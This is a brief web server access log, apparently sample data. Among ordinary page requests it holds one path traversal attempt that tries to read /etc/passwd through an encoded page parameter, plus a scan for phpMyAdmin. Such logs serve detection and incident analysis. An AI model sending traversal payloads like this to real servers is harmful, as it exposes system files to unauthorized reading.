10.0.0.24 - - [21/May/2026:08:10:02 +0000] "GET /contact HTTP/1.1" 200 2722 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.77 - - [21/May/2026:11:04:19 +0000] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 302 397 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:19:48:45 +0000] "GET /search?q=laptop HTTP/1.1" 200 3354 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.78 - - [21/May/2026:19:24:24 +0000] "GET /phpMyAdmin HTTP/1.1" 404 822 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:08:12:17 +0000] "GET /static/img/logo.png HTTP/1.1" 200 1193 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.22 - - [21/May/2026:16:11:36 +0000] "GET /index.html HTTP/1.1" 200 5503 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Ge